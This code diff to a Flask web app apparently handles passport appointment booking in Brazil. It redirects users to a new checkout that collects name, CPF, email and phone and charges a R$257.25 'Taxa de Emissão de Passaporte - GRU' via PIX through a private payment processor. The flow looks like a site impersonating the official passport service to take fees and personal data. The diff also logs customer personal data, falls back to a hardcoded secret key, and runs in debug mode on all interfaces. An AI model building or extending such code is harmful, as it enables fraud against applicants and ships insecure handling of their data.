@@ -1,9 +1,10 @@
-from flask import Flask, render_template, request, redirect, url_for, session, send_file, make_response
+from flask import Flask, render_template, request, redirect, url_for, session, send_file, make_response, jsonify
 from datetime import datetime, timedelta
 import random
 import string
 import os
 import json
+import requests
 from io import BytesIO
 from reportlab.lib.pagesizes import A4
 from reportlab.lib import colors
@@ -15,6 +16,9 @@ from reportlab.pdfgen import canvas
 
 app = Flask(__name__)
 app.secret_key = os.environ.get('SESSION_SECRET', 'sua_chave_secreta_aqui_123456')
+
+FOURM_API_TOKEN = os.environ.get('FOURM_PAYMENTS_API_TOKEN')
+FOURM_API_URL = 'https://app.4mpagamentos.com/api/v1'
 
 def carregar_unidades():
     with open('unidades_atendimento.json', 'r', encoding='utf-8') as f:
@@ -120,7 +124,7 @@ def protocolo():
         session['data_agendamento'] = data_agendamento
         session['horario_agendamento'] = horario_agendamento
         
-        return redirect(url_for('confirmacao_agendamento'))
+        return redirect(url_for('checkout'))
     
     protocolo = session.get('protocolo', 'N/A')
     data_emissao = session.get('data_emissao', 'N/A')
@@ -312,6 +316,149 @@ def download_protocolo():
     ))
     
     return response
+
+@app.route('/checkout')
+def checkout():
+    dados_pessoais = session.get('dados_pessoais', {})
+    dados_complementares = session.get('dados_complementares', {})
+    
+    dados_usuario = {
+        'nome': dados_pessoais.get('nome', ''),
+        'cpf': dados_pessoais.get('cpf', '').replace('.', '').replace('-', ''),
+        'email': dados_pessoais.get('email', ''),
+        'telefone': dados_complementares.get('telefone', '').replace('(', '').replace(')', '').replace('-', '').replace(' ', '')
+    }
+    
+    return render_template('checkout.html', dados_usuario=dados_usuario)
+
+@app.route('/api/gerar-pix', methods=['POST'])
+def gerar_pix():
+    try:
+        data = request.get_json()
+        
+        nome = data.get('nome', '').upper()
+        cpf = data.get('cpf', '').replace('.', '').replace('-', '')
+        email = data.get('email', '')
+        telefone = data.get('telefone', '').replace('(', '').replace(')', '').replace('-', '').replace(' ', '')
+        
+        if not all([nome, cpf, email, telefone]):
+            return jsonify({
+                'success': False,
+                'error': 'Dados incompletos'
+            }), 400
+        
+        headers = {
+            'Authorization': f'Bearer {FOURM_API_TOKEN}',
+            'Content-Type': 'application/json'
+        }
+        
+        payload = {
+            'amount': '257.25',
+            'customer_name': nome,
+            'customer_email': email,
+            'customer_cpf': cpf,
+            'customer_phone': telefone,
+            'description': 'Taxa de Emissão de Passaporte - GRU'
+        }
+        
+        print(f'Enviando requisição para 4M Payments: {payload}')
+        
+        response = requests.post(
+            f'{FOURM_API_URL}/payments',
+            json=payload,
+            headers=headers,
+            timeout=30
+        )
+        
+        print(f'Status da resposta: {response.status_code}')
+        print(f'Resposta: {response.text}')
+        
+        if response.status_code == 201:
+            response_data = response.json()
+            
+            if 'data' in response_data and response_data['data']:
+                pix_data = response_data['data']
+                
+                session['transaction_id'] = pix_data.get('transaction_id')
+                
+                return jsonify({
+                    'success': True,
+                    'transaction_id': pix_data.get('transaction_id'),
+                    'pix_code': pix_data.get('pix_code'),
+                    'status': pix_data.get('status', 'pending')
+                })
+            else:
+                return jsonify({
+                    'success': False,
+                    'error': 'Resposta inválida da API'
+                }), 500
+        else:
+            error_data = response.json() if response.text else {}
+            return jsonify({
+                'success': False,
+                'error': error_data.get('error', {}).get('message', 'Erro ao gerar PIX')
+            }), response.status_code
+            
+    except Exception as e:
+        print(f'Erro ao gerar PIX: {str(e)}')
+        return jsonify({
+            'success': False,
+            'error': str(e)
+        }), 500
+
+@app.route('/api/verificar-pagamento/<transaction_id>')
+def verificar_pagamento(transaction_id):
+    try:
+        headers = {
+            'Authorization': f'Bearer {FOURM_API_TOKEN}',
+            'Content-Type': 'application/json'
+        }
+        
+        response = requests.get(
+            f'{FOURM_API_URL}/payments/{transaction_id}',
+            headers=headers,
+            timeout=30
+        )
+        
+        if response.status_code == 200:
+            response_data = response.json()
+            
+            if 'data' in response_data and response_data['data']:
+                payment_data = response_data['data']
+                status = payment_data.get('status', 'pending')
+                
+                return jsonify({
+                    'success': True,
+                    'status': status,
+                    'paid': status == 'paid'
+                })
+            else:
+                return jsonify({
+                    'success': False,
+                    'status': 'unknown'
+                })
+        else:
+            return jsonify({
+                'success': False,
+                'status': 'error'
+            }), response.status_code
+            
+    except Exception as e:
+        print(f'Erro ao verificar pagamento: {str(e)}')
+        return jsonify({
+            'success': False,
+            'status': 'error',
+            'error': str(e)
+        }), 500
+
+@app.route('/sucesso')
+def sucesso():
+    protocolo = session.get('protocolo', 'N/A')
+    transaction_id = session.get('transaction_id', 'N/A')
+    
+    return render_template('sucesso.html', 
+                         protocolo=protocolo,
+                         transaction_id=transaction_id)
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
